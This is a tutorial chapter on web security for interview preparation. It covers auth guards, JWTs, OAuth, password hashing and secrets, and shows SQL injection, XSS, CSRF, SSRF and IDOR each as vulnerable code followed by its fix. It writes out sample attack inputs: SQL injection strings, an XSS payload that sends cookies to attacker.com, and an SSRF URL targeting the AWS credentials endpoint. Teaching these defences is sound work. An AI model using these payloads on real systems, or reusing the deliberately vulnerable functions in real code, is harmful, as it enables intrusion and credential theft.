Security — Authentication, Authorization, and Common Vulnerabilities

Security is the topic most developers skip until they get breached. In interviews, it immediately separates "developer" from "senior engineer."

What you'll learn

  • The crystal-clear distinction between authentication and authorization
  • JWT deep dive: structure, gotchas, refresh token rotation, and NestJS guard code
  • OAuth 2.0 and OpenID Connect flows with PKCE
  • SQL Injection, XSS, CSRF, SSRF, and IDOR — vulnerability, exploit, and fix for each
  • Password hashing, secrets management, and security headers

"Security is the chapter most developers skip until they get breached. In interviews, it's the topic that immediately separates 'developer' from 'senior engineer.' Every engineering decision has security implications."

This chapter is not a comprehensive security course. It's the 20% of security knowledge that appears in 80% of senior engineering interviews, taught the right way: vulnerabilities demonstrated with real code, fixes shown immediately after, and clear principles you can articulate under pressure.

1. The Big Idea: Authentication vs Authorization

Analogy: A hotel. Authentication is checking in at the front desk, showing your ID, and receiving a key card. The hotel now knows who you are. Authorization is what floors and rooms your key card can open. The executive lounge on floor 30 only opens for Platinum members. The key card being valid (authentication) doesn't mean you can go anywhere (authorization). These are two completely separate problems that beginners consistently conflate.
Authentication (AuthN): Verifying identity. Who are you? Mechanisms: username/password, OAuth, biometrics, MFA.

Authorization (AuthZ): Verifying permissions. What are you allowed to do? Mechanisms: RBAC (role-based), ABAC (attribute-based), ACLs, ownership checks.

NestJS: Authentication guard followed by Authorization guard — two separate layers:

// auth/jwt.guard.ts — Authentication: verifies the token is valid and sets req.user
import { Injectable, ExecutionContext, UnauthorizedException } from '@nestjs/common';
import { AuthGuard } from '@nestjs/passport';

@Injectable()
export class JwtAuthGuard extends AuthGuard('jwt') {
  handleRequest(err: any, user: any) {
    if (err || !user) {
      throw new UnauthorizedException('Invalid or missing token');
    }
    return user; // Sets req.user for downstream handlers
  }
}

// auth/roles.guard.ts — Authorization: verifies the authenticated user has permission
import { Injectable, CanActivate, ExecutionContext, ForbiddenException } from '@nestjs/common';
import { Reflector } from '@nestjs/core';

@Injectable()
export class RolesGuard implements CanActivate {
  constructor(private reflector: Reflector) {}

  canActivate(context: ExecutionContext): boolean {
    const requiredRoles = this.reflector.get<string[]>('roles', context.getHandler());
    if (!requiredRoles) return true; // No role restriction on this route

    const { user } = context.switchToHttp().getRequest();
    const hasRole = requiredRoles.some(role => user.roles?.includes(role));

    if (!hasRole) {
      throw new ForbiddenException('Insufficient permissions'); // 403, not 401
    }
    return true;
  }
}

// Controller: authentication first, then authorization
@Controller('admin')
@UseGuards(JwtAuthGuard, RolesGuard)   // Order matters: JwtAuthGuard runs first
export class AdminController {
  @Get('users')
  @SetMetadata('roles', ['admin'])
  getAllUsers() { /* ... */ }
}
Common mistake: Returning 401 Unauthorized when the user is authenticated but lacks permission. The correct response for insufficient permissions is 403 Forbidden. 401 means "you need to authenticate." 403 means "you're authenticated but not allowed."

2. JWT Deep Dive

Analogy: A signed permission slip from school. The school (authentication server) writes "Student A is allowed to attend the field trip" and stamps it with the school's official seal. Any teacher can verify the seal is real without calling the school — they just check the stamp. That's a JWT: a self-contained, verifiable credential. No database lookup required to verify it.

A JWT has three base64url-encoded parts separated by dots: header.payload.signature.

  • Header: algorithm (alg) and type (typ: "JWT")
  • Payload: claims — sub (subject/user ID), iat (issued at), exp (expiry), custom claims like roles
  • Signature: HMAC-SHA256 or RSA signature over header + payload. Tamper-evident.
JWTs are encoded, NOT encrypted. The payload is readable by anyone. Never put passwords, credit card numbers, or PII in a JWT payload. Only put data you're comfortable being public: user ID, roles, expiry.

Critical JWT gotchas that interviewers test:

  • algorithm: "none" vulnerability: Some early libraries accepted an unsigned JWT if the header declared alg: none. Always validate the algorithm server-side. Only accept the algorithms you explicitly configured.
  • RS256 > HS256 for distributed systems: HS256 uses a shared secret — every service that validates tokens must know the secret. RS256 uses a key pair: the auth server signs with the private key; any service verifies with the public key. Safer key distribution.
  • Short expiry + refresh token: Access tokens should expire in 15 minutes. Refresh tokens (7–30 days) issue new access tokens without re-login.
  • httpOnly cookies, not localStorage: Storing JWTs in localStorage exposes them to XSS. Store in httpOnly, Secure, SameSite=Strict cookies — JavaScript cannot read them.
  • Revocation problem: You can't invalidate a JWT before it expires without a server-side blocklist (which reintroduces a database lookup, reducing the stateless benefit). Keep access tokens short-lived to limit damage from leaked tokens.

Full NestJS JWT guard with refresh token rotation:

// auth/auth.service.ts
import { Injectable } from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import * as bcrypt from 'bcrypt';

@Injectable()
export class AuthService {
  constructor(
    private jwtService: JwtService,
    private userRepository: UserRepository,
    private refreshTokenRepository: RefreshTokenRepository,
  ) {}

  async login(email: string, password: string) {
    const user = await this.userRepository.findByEmail(email);
    if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
      throw new UnauthorizedException('Invalid credentials');
    }

    return this.issueTokenPair(user.id, user.roles);
  }

  async refreshTokens(refreshToken: string) {
    const stored = await this.refreshTokenRepository.findByToken(refreshToken);
    if (!stored || stored.expiresAt < new Date()) {
      throw new UnauthorizedException('Refresh token invalid or expired');
    }

    // Rotation: invalidate the used refresh token immediately (prevents replay)
    await this.refreshTokenRepository.delete(stored.id);

    return this.issueTokenPair(stored.userId, stored.roles);
  }

  private async issueTokenPair(userId: string, roles: string[]) {
    const accessToken = this.jwtService.sign(
      { sub: userId, roles },
      { expiresIn: '15m', algorithm: 'RS256' }
    );

    const refreshToken = crypto.randomUUID();
    await this.refreshTokenRepository.save({
      token: refreshToken,
      userId,
      roles,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000), // 7 days
    });

    return { accessToken, refreshToken };
  }
}

3. OAuth 2.0 and OpenID Connect

Analogy: You want to get into an exclusive nightclub. The club doesn't know who you are. But the government does — they issued your passport. You show the nightclub your government-issued ID. The nightclub verifies the ID is real (checks the signature) and lets you in. You never told the nightclub your address, bank account, or other personal details from your passport — only the minimum needed: your age and identity. OAuth 2.0 is this delegation: a trusted third party (Google, GitHub) vouches for you, and the app only gets the scopes (permissions) you explicitly grant.

Authorization Code with PKCE (the correct flow for web apps and SPAs):

  1. App generates a random code_verifier and hashes it to code_challenge.
  2. User is redirected to the provider (Google) with code_challenge and requested scopes.
  3. User authenticates with Google and grants permission.
  4. Google redirects back with an authorization code.
  5. App exchanges the code + code_verifier (the original random value) for tokens. PKCE prevents code interception attacks — a stolen code is useless without the verifier.

Client Credentials flow (machine-to-machine, no user involved): Service A sends its client_id and client_secret directly to the auth server and receives an access token. Used for microservice-to-microservice authentication.

OpenID Connect (OIDC) adds identity to OAuth 2.0. OAuth 2.0 gives you an access token for APIs. OIDC additionally gives you an ID token (a JWT with the user's identity: name, email, picture). When you see "Sign in with Google," that's OIDC.

4. Common Vulnerabilities

SQL Injection

Analogy: The classic "Bobby Tables" comic. A school's database stores student names. A parent names their child Robert'); DROP TABLE Students;--. When the school's software does "INSERT INTO Students (name) VALUES ('" + name + "'"), the database executes the injected SQL. The student records are gone. 
// VULNERABLE: string concatenation — never do this
async findUser_BAD(email: string) {
  const query = `SELECT * FROM users WHERE email = '${email}'`;
  // Attacker sends email = "' OR '1'='1" → returns ALL users
  // Attacker sends email = "'; DROP TABLE users;--" → deletes users table
  return this.db.query(query);
}

// SAFE: parameterized queries — the database treats the input as data, never as SQL
async findUser_GOOD(email: string) {
  return this.db.query('SELECT * FROM users WHERE email = $1', [email]);
  // With TypeORM:
  return this.userRepository.findOne({ where: { email } });
  // With Prisma:
  return this.prisma.user.findUnique({ where: { email } });
}
Defense: Always use parameterized queries or an ORM that parameterizes for you. Never concatenate user input into SQL strings. Apply the principle of least privilege — the database user your app connects with should only have the permissions it actually needs.

Cross-Site Scripting (XSS)

Analogy: A community library has a suggestion box. A malicious visitor leaves a "note" that is actually a script: "Whenever someone reads this note, automatically send me their library card number." The library staff posts the note on the public board. Every patron who reads the board executes the script without knowing it. 
// VULNERABLE: innerHTML with user-controlled content
const userInput = '<img src=x onerror="fetch(`https://attacker.com/?cookie=${document.cookie}`)">';
element.innerHTML = userInput; // Executes the attacker's JavaScript in the victim's browser

// SAFE: use textContent — treats input as text, not markup
element.textContent = userInput; // Renders as literal text, harmless

// SAFE: sanitize HTML if you genuinely need to render markup (e.g., rich text editors)
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

Server-side defense — Content Security Policy header:

// In your NestJS main.ts with Helmet:
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],   // No inline scripts, no external scripts
      imgSrc: ["'self'", "data:", "https:"],
      styleSrc: ["'self'", "'unsafe-inline'"],
    },
  })
);

Cross-Site Request Forgery (CSRF)

Analogy: A criminal creates a forged document that looks like it came from your bank. They trick you into signing it by hiding it under a legitimate document. The bank, seeing your authentic signature, executes the transaction. CSRF tricks your browser into making authenticated requests to a legitimate site on your behalf, using your existing session cookie. 
// Prevention 1: SameSite cookie attribute — browser won't send cookie on cross-origin requests
// In NestJS session/cookie config:
{
  sameSite: 'strict',  // 'strict' or 'lax' — prevents cross-site cookie sending
  httpOnly: true,
  secure: true,
}

// Prevention 2: CSRF token (for non-SameSite scenarios)
// Server generates a random token, stores it in session, sends it in HTML form
// Client must include it in every state-changing request
// Attacker's forged form can't include the token (it's a secret only the legitimate page knows)

SSRF — Server-Side Request Forgery

Analogy: You hire an employee to fetch a document from a location you specify. Normally they fetch from the public library. An attacker tells them to fetch from the company's internal secret vault instead. The employee, being helpful, goes to the vault. SSRF tricks your server into making requests to internal infrastructure (AWS metadata endpoint, internal services) on the attacker's behalf. 
// VULNERABLE: fetching a user-provided URL without validation
async fetchPreview_BAD(url: string) {
  const response = await fetch(url);
  // Attacker sends url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  // Your server fetches AWS IAM credentials and returns them to the attacker
  return response.text();
}

// SAFE: validate against an allowlist of domains
const ALLOWED_DOMAINS = ['api.trusted-partner.com', 'cdn.yourapp.com'];

async fetchPreview_GOOD(url: string) {
  const parsed = new URL(url); // Throws if URL is malformed
  if (!ALLOWED_DOMAINS.includes(parsed.hostname)) {
    throw new BadRequestException('URL not in allowlist');
  }
  // Also block private IP ranges: 10.x, 172.16.x, 192.168.x, 169.254.x, ::1
  const ip = await dns.resolve(parsed.hostname);
  if (isPrivateIP(ip)) {
    throw new BadRequestException('Internal addresses not permitted');
  }
  return fetch(url).then(r => r.text());
}

IDOR — Insecure Direct Object Reference

Analogy: A coat check. You give your coat in and receive ticket number 42. You notice the tickets are sequential. You hand in ticket 41 and receive someone else's coat. The attendant checked that you had a valid ticket (authentication) but didn't check whether ticket 41 belongs to you (authorization). IDOR is checking authentication without checking ownership. 
// VULNERABLE: authenticates the user but doesn't check ownership
@Get('documents/:id')
@UseGuards(JwtAuthGuard)
async getDocument_BAD(@Param('id') id: string) {
  return this.documentRepository.findById(id);
  // Any authenticated user can access any document by changing the ID in the URL
}

// SAFE: always verify the requesting user owns the resource
@Get('documents/:id')
@UseGuards(JwtAuthGuard)
async getDocument_GOOD(@Param('id') id: string, @Request() req) {
  const document = await this.documentRepository.findById(id);
  if (!document) throw new NotFoundException();
  if (document.ownerId !== req.user.sub) {
    throw new ForbiddenException('Access denied');
  }
  return document;
}

5. Password Hashing

Analogy: A one-way blender. You put strawberries in, you get a smoothie out. You cannot reconstruct the strawberries from the smoothie. A cryptographic hash function is the same — given a password, you produce a hash. You cannot reverse it to get the password back. When a user logs in, you hash their input and compare it to the stored hash.
NEVER use MD5 or SHA-1 for passwords. They're fast — which is exactly wrong for passwords. Attackers can test billions of guesses per second. Use a slow, purpose-built password hash: bcrypt (cost factor 12+) or Argon2id (the current gold standard). 
import * as bcrypt from 'bcrypt';

// Registration: hash before storing
async registerUser(email: string, plainPassword: string) {
  const COST_FACTOR = 12; // Each increment doubles the work. 12 = ~250ms on modern hardware.
  const passwordHash = await bcrypt.hash(plainPassword, COST_FACTOR);
  await this.userRepository.save({ email, passwordHash });
  // plainPassword is never stored — not in DB, not in logs
}

// Login: compare in constant time (bcrypt.compare prevents timing attacks)
async verifyPassword(plainPassword: string, storedHash: string): Promise<boolean> {
  return bcrypt.compare(plainPassword, storedHash);
  // Returns true if they match. Takes the same time whether the password is right or wrong.
  // Never do: storedHash === bcrypt.hashSync(plain) — hash output varies per salt
}

// Argon2id (stronger, preferred for new systems):
import * as argon2 from 'argon2';
const hash = await argon2.hash(password, { type: argon2.argon2id });
const valid = await argon2.verify(hash, password);

6. Secrets Management

Never commit secrets to source control. This includes API keys, database passwords, JWT signing keys, and OAuth client secrets. GitHub's secret scanning catches many cases automatically, but the damage is done the moment a secret hits a public repo. Assume any committed secret is compromised.

The layered approach:

  1. Local development: .env file (in .gitignore). Use dotenv to load.
  2. CI/CD: Environment secrets stored in GitHub Actions Secrets / GitLab CI Variables. Never echoed to logs.
  3. Production: Kubernetes Secrets (base64 encoded, not encrypted by default — use a secrets operator or external secrets manager). AWS Secrets Manager, HashiCorp Vault, or GCP Secret Manager for serious workloads.
# .gitignore — always include these
.env
.env.local
.env.production
*.pem
*.key

# Verify no secrets are staged before committing:
# npm install -g git-secrets
# git secrets --install
# git secrets --register-aws   # Scans for AWS key patterns

# In NestJS — load from environment, never hardcode:
@Module({
  imports: [
    ConfigModule.forRoot({ isGlobal: true }),
    JwtModule.registerAsync({
      inject: [ConfigService],
      useFactory: (config: ConfigService) => ({
        privateKey: config.get('JWT_PRIVATE_KEY'),  // Loaded from env, not hardcoded
        signOptions: { algorithm: 'RS256', expiresIn: '15m' },
      }),
    }),
  ],
})

7. Security Headers with Helmet.js

Security headers tell the browser how to behave when loading your application. A single line of Helmet middleware sets them all:

// main.ts
import helmet from 'helmet';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  app.use(helmet()); // Applies all of the following and more:
  // Content-Security-Policy: restricts sources for scripts, styles, media
  // X-Frame-Options: DENY — prevents clickjacking via iframes
  // Strict-Transport-Security: forces HTTPS for 1 year (HSTS)
  // X-Content-Type-Options: nosniff — prevents MIME-type sniffing
  // X-XSS-Protection: 1; mode=block — legacy XSS filter in older browsers
  // Referrer-Policy: no-referrer — don't leak URLs to third parties

  await app.listen(3000);
}

Senior vs Junior

Question: "How would you secure a REST API?"

Junior Answer "I'd add JWT authentication."
Senior Answer "Security is layered — JWTs are just the start. Here's the full picture. At the transport layer, HTTPS everywhere — no exceptions, HSTS header to enforce it. At the input layer, validate every request body with class-validator and a global ValidationPipe; reject anything that doesn't match the expected schema rather than trying to sanitize it. Use a whitelist approach. At the data layer, parameterized queries everywhere — never string-concatenate user input into SQL. At the application layer, verify ownership on every resource access — never just check that the user is authenticated; also check they own that specific resource. Apply rate limiting with a library like Throttler to prevent brute force and DDoS. Serve Helmet.js headers to block clickjacking, MIME sniffing, and restrict script sources. At the dependency layer, run npm audit in CI and fail the build on high or critical vulnerabilities. At the operations layer, store secrets in a vault or environment variables — never in code. Audit log sensitive actions (login, permission changes, data exports). Rotate keys regularly. For high-sensitivity endpoints, add IP allowlisting or mutual TLS. MFA for administrative access."

Practice Questions

Beginner

What is the difference between authentication and authorization? Give a real-world example of each.

Authentication answers "Who are you?" — the process of verifying identity. Logging in with email and password is authentication. Authorization answers "What are you allowed to do?" — the process of checking permissions after identity is confirmed. A logged-in user being blocked from accessing the admin dashboard because they lack the admin role is authorization. Authentication always comes first; authorization checks are meaningless without knowing who the user is.

Intermediate

A user is accessing other users' documents via GET /api/documents/456. Write the fix in NestJS.

This is an IDOR vulnerability — the route authenticates the user but doesn't verify they own the document. Fix:

@Get('documents/:id')
@UseGuards(JwtAuthGuard)
async getDocument(@Param('id') id: string, @Request() req) {
  const document = await this.documentService.findById(id);

  // Always check for existence first — don't leak whether a document exists
  if (!document) {
    throw new NotFoundException('Document not found');
  }

  // Authorization: verify ownership before returning data
  if (document.ownerId !== req.user.sub) {
    // Return 404 rather than 403 to avoid confirming the document exists
    throw new NotFoundException('Document not found');
  }

  return document;
}

Returning 404 (not 403) for unauthorized access prevents information leakage — the attacker doesn't learn that document 456 exists and belongs to someone else.

Advanced

Walk through discovering an IDOR vulnerability, writing a test that catches it, and fixing it in NestJS with proper ownership checks.

Step 1 — Discover the vulnerability. During a security review or pen test, you notice that GET /api/documents/:id returns a document for any authenticated user, regardless of who created it. Testing with two accounts confirms user B can read user A's private documents simply by guessing or enumerating IDs.

Step 2 — Write a failing test that catches it.

// documents/documents.controller.spec.ts
describe('GET /api/documents/:id — IDOR protection', () => {
  let app: INestApplication;
  let userAToken: string;
  let userBToken: string;
  let userADocumentId: string;

  beforeAll(async () => {
    // Set up two users and a document belonging to User A
    userAToken = await loginAs('user-a@test.com', 'password');
    userBToken = await loginAs('user-b@test.com', 'password');
    const { body } = await request(app.getHttpServer())
      .post('/api/documents')
      .set('Authorization', `Bearer ${userAToken}`)
      .send({ title: 'Secret Document', content: 'Private content' });
    userADocumentId = body.id;
  });

  it('allows the owner to read their document', async () => {
    const response = await request(app.getHttpServer())
      .get(`/api/documents/${userADocumentId}`)
      .set('Authorization', `Bearer ${userAToken}`);
    expect(response.status).toBe(200);
    expect(response.body.title).toBe('Secret Document');
  });

  it('prevents non-owners from accessing the document (IDOR fix)', async () => {
    // This test FAILS before the fix — it gets 200 instead of 404
    const response = await request(app.getHttpServer())
      .get(`/api/documents/${userADocumentId}`)
      .set('Authorization', `Bearer ${userBToken}`);
    expect(response.status).toBe(404); // Not 200, not 403
  });
});

Step 3 — Fix the vulnerability.

// documents/documents.service.ts
@Injectable()
export class DocumentsService {
  constructor(private readonly documentRepository: DocumentRepository) {}

  // Old: finds by ID only — returns any document to any caller
  // async findById(id: string): Promise<Document> {
  //   return this.documentRepository.findOne({ where: { id } });
  // }

  // Fixed: findByIdAndOwner — the query itself enforces ownership at the DB level
  async findByIdAndOwner(id: string, ownerId: string): Promise<Document | null> {
    return this.documentRepository.findOne({
      where: { id, ownerId },  // SQL: WHERE id = $1 AND owner_id = $2
    });
    // If the document exists but belongs to someone else, this returns null —
    // identical to "document not found" from the caller's perspective
  }
}

// documents/documents.controller.ts
@Get(':id')
@UseGuards(JwtAuthGuard)
async getDocument(@Param('id') id: string, @Request() req): Promise<Document> {
  const document = await this.documentsService.findByIdAndOwner(id, req.user.sub);
  if (!document) {
    throw new NotFoundException('Document not found');
    // Intentionally 404 — don't confirm the document's existence to unauthorized callers
  }
  return document;
}

Key principle: The ownership check is in the service query itself — not a conditional after the fetch. This is safer: the database filters out unauthorized records at the SQL level. Even if a developer later refactors the controller and forgets to add an ownership check, the service method still enforces it.

Also add an integration test for admin access, if admins legitimately need to access all documents, use a separate endpoint (/admin/documents/:id) protected by a separate admin guard — don't weaken the ownership check on the user-facing endpoint.

Chapter Summary

  • Authentication (who you are) and authorization (what you can do) are separate problems. Treat them with separate guards. Return 401 for authentication failure, 403 for authorization failure.
  • JWTs are encoded, not encrypted. Use RS256, keep access tokens short-lived (15 min), store in httpOnly cookies, and rotate refresh tokens on every use.
  • SQL Injection, XSS, CSRF, SSRF, and IDOR are the five vulnerabilities most commonly tested in senior interviews. Know the pattern: vulnerability, exploit, parameterized fix.
  • Never store plain-text passwords. Use bcrypt (cost 12+) or Argon2id. Never use MD5 or SHA-1 for passwords.
  • Secrets belong in environment variables and vaults — never in code or git history. Apply Helmet.js security headers. Run npm audit in CI.
